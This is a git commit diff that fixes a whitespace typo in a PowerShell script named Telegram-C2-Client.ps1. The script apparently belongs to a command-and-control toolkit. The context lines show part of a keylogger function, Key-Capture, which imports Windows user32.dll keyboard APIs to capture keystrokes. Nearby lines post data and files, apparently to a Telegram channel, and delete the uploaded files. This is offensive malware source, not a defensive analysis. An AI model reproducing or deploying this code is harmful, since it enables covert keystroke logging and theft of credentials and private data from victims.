47f3c168495e8b2975cfb17f891e019fe7c1fce5
poiuztreq <harder.alex@gmx.net>
2023-11-23 23:37:41 +0100

    fixed a typo

--- Command-and-Control/Telegram-C2-Client.ps1
+++ Command-and-Control/Telegram-C2-Client.ps1
@@ -200,7 +200,7 @@ $bitmap.Dispose()
 Post-File; Remove-Item -Path $filePath -Force
 }
 
-Function Key-Capture {
+Function Key-Capture{
 $contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
 Post-Message | Out-Null
 $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
